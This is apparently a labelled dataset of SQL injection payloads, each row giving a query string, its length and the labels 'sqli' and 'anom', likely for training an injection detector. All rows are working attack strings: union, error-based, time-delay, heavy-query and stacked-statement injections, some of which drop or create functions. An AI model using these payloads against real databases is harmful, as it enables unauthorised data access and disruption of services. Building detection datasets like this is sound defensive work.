Query,Length,Attack,Label
1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,216,sqli,anom
1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,58,sqli,anom
"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",111,sqli,anom
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",114,sqli,anom
"-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--",97,sqli,anom
"-6108') union all select 2519,2519,2519,2519--",46,sqli,anom
1) where 3979=3979 rlike sleep(5)--,35,sqli,anom
-8143) union all select 3014--,30,sqli,anom
"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",258,sqli,anom
1') where 6624=6624 and 5392=8258,33,sqli,anom
"-3884"" where 8012=8012 union all select 8012,8012#",50,sqli,anom
"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""",117,sqli,anom
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",96,sqli,anom
"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",208,sqli,anom
"1) where 9371=9371 union all select null,null,null,null,null,null,null--",72,sqli,anom
"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",113,sqli,anom
"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",113,sqli,anom
"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--",83,sqli,anom
-9336' or 5641=9488#,20,sqli,anom
"-3205"") union all select 5233,5233,5233,5233#",45,sqli,anom
1') rlike (select * from (select(sleep(5)))vwyq)#,49,sqli,anom
"1"") where 7548=7548;select sleep(5)--",37,sqli,anom
1';(select * from (select(sleep(5)))srmq),41,sqli,anom
1'));select case when 2095=9074 then 1 else null end--,54,sqli,anom
"1%"")) rlike (select * from (select(sleep(5)))vwyq)#",51,sqli,anom
1' where 4134=4134 and 1102=6300--,34,sqli,anom
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",97,sqli,anom
"-5800"") or 6872=6872 and (""tcab"" like ""tcab",43,sqli,anom
"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",77,sqli,anom
"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",219,sqli,anom
1,2,sqli,anom
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",90,sqli,anom
"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",87,sqli,anom
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf",212,sqli,anom
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",82,sqli,anom
1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,57,sqli,anom
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",84,sqli,anom
"1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",213,sqli,anom
1'||(select 'puco' where 2605=2605 union all select null#,57,sqli,anom
1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',249,sqli,anom
"make_set(5679=9769,9769)",24,sqli,anom
"-2333' union all select 9714,9714,9714--",40,sqli,anom
"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",60,sqli,anom
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje",123,sqli,anom
1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,85,sqli,anom
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",170,sqli,anom
"-1197"")) as dfsy where 8857=8857 or 3038=3038",45,sqli,anom
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",77,sqli,anom
"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",199,sqli,anom
"1')) union all select null,null,null,null,null--",48,sqli,anom
1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',109,sqli,anom
1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,253,sqli,anom
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#",48,sqli,anom
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",163,sqli,anom
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,112,sqli,anom
"-2518' union all select 6818,6818,6818,6818,6818,6818#",54,sqli,anom
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",120,sqli,anom
"1;select count(*) from generate_series(1,5000000)-- gqkk",56,sqli,anom
"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",240,sqli,anom
-3938%'))) or 2034=7209#,24,sqli,anom
"1%')) union all select null,null,null#",38,sqli,anom
1) where 5866=5866 and 4595=4595#,33,sqli,anom
1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,67,sqli,anom
"1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",236,sqli,anom
-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,227,sqli,anom
"-7868"" union all select 1805--",30,sqli,anom
1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,77,sqli,anom
1));begin user_lock.sleep(5); end and ((6874=6874,49,sqli,anom
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",118,sqli,anom
"1%"") or elt(5873=5873,sleep(5))#",32,sqli,anom
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",98,sqli,anom
"1""))) and 7533=7533 and (((""alvd"" like ""alvd",44,sqli,anom
"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",115,sqli,anom
1'));(select * from (select(sleep(5)))acdk)#,44,sqli,anom
"1') as ildf where 5545=5545 union all select null,null,null,null#",65,sqli,anom
 or '1' = '1,13,sqli,anom
-3752%' union all select 9351--,31,sqli,anom
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",109,sqli,anom
1%');if(7899=7899) select 7899 else drop function zbbp--,56,sqli,anom
1' where 3188=3188 and 9198=9198--,34,sqli,anom
"-4954%"") or 5244=4832",21,sqli,anom
1'))) and 3602=1990#,20,sqli,anom
"-7142')) union all select 5083,5083,5083,5083#",46,sqli,anom
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--",62,sqli,anom
"-9532)) union all select 6039,6039,6039,6039--",46,sqli,anom
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,65,sqli,anom
"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",111,sqli,anom
"1') where 3476=3476 and elt(1210=1210,sleep(5))--",49,sqli,anom
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",103,sqli,anom
-9100) or 8792=9550--,21,sqli,anom
"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",140,sqli,anom
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",108,sqli,anom
"1' in boolean mode);select count(*) from generate_series(1,5000000)#",68,sqli,anom
1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,46,sqli,anom
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",57,sqli,anom
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",62,sqli,anom
"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))",95,sqli,anom
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",114,sqli,anom
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",124,sqli,anom
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",65,sqli,anom
1%' or (select * from (select(sleep(5)))sddo)#,46,sqli,anom
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,223,sqli,anom
1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,59,sqli,anom
"1') and 3824=benchmark(5000000,md5(0x76555642))",47,sqli,anom
"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",95,sqli,anom
"-3963"" or 1224=5119",19,sqli,anom
1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,136,sqli,anom
-1354)) or 8571=8571--,22,sqli,anom
"1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",191,sqli,anom
"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",226,sqli,anom
"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",114,sqli,anom
"1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",139,sqli,anom
"1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",110,sqli,anom
"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='",214,sqli,anom
"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",104,sqli,anom
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
"-7324) or make_set(8486=6544,6544)",34,sqli,anom
"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",131,sqli,anom
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw",158,sqli,anom
1 and 6969=(select 6969 from pg_sleep(5))-- yczq,48,sqli,anom
"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",112,sqli,anom
"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--",54,sqli,anom
"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--",70,sqli,anom
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",219,sqli,anom
"1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",68,sqli,anom
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl",217,sqli,anom
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",120,sqli,anom
"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",206,sqli,anom
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",90,sqli,anom
"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",93,sqli,anom
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",214,sqli,anom
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",70,sqli,anom
"1'))) union all select null,null,null--",39,sqli,anom
"-4319"") where 7534=7534 or 8246=3217",36,sqli,anom
"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",124,sqli,anom
1'));begin user_lock.sleep(5); end--,36,sqli,anom
"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",215,sqli,anom
"1%') union all select null,null,null,null,null,null--",53,sqli,anom
"-8929%') union all select 9486,9486,9486,9486#",46,sqli,anom
"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",76,sqli,anom
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",264,sqli,anom
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",164,sqli,anom
"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,sqli,anom
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",176,sqli,anom
"1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",124,sqli,anom
1))) and 9198=9198--,20,sqli,anom
-4339) where 7178=7178 or 4008=7232,35,sqli,anom
"1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",91,sqli,anom
1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,70,sqli,anom
"1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",207,sqli,anom
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""zoag"" like ""zoag",232,sqli,anom
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('kyos' like 'kyos",87,sqli,anom
"1%"");select pg_sleep(5)--",25,sqli,anom
"1)) as midl where 9046=9046 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",104,sqli,anom
"-9313%"") or 5971=4572#",22,sqli,anom
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""",46,sqli,anom
"-6093') where 9676=9676 union all select 9676,9676,9676,9676,9676,9676--",72,sqli,anom
"-3179'+(select 'tzzz' where 3191=3191 union all select 3191,3191,3191,3191,3191#",80,sqli,anom
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""yxes"" like ""yxes",85,sqli,anom
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('frpo' like 'frpo",94,sqli,anom
1' where 9583=9583 and 5319=7670#,33,sqli,anom
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",205,sqli,anom
"1"")));if(8727=4039) select 8727 else drop function giql--",57,sqli,anom
"1"" and sleep(5)#",16,sqli,anom
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",102,sqli,anom
"1""))) or elt(5873=5873,sleep(5))#",33,sqli,anom
"1'+(select pdfv where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",126,sqli,anom
"1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#",47,sqli,anom
"-3672"")) union all select 6093#",31,sqli,anom
"1%""))) rlike sleep(5) and (((""%""=""",34,sqli,anom
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo",158,sqli,anom
"1%')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='",167,sqli,anom
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('gfll'='gfll",155,sqli,anom
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,sqli,anom
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('ossj'='ossj",66,sqli,anom
"1"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",94,sqli,anom
"1"")) and 7656=5604 and ((""zuhv""=""zuhv",37,sqli,anom
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('nlnk' like 'nlnk",183,sqli,anom
"1 where 4944=4944 union all select null,null,null,null,null,null,null,null,null#",80,sqli,anom
1%') or sleep(5)#,17,sqli,anom
"1'+(select unzl where 3432=3432 union all select null,null,null,null--",70,sqli,anom
"1,iif(1440=4612,1,1/0)",22,sqli,anom
"-9111"" or 3038=3038",19,sqli,anom
"1%'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",124,sqli,anom
"-7258 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",136,sqli,anom
1)));select case when 7717=7717 then 1 else null end--,54,sqli,anom
"1%'));iif(5257=5257,1,1/0)",26,sqli,anom
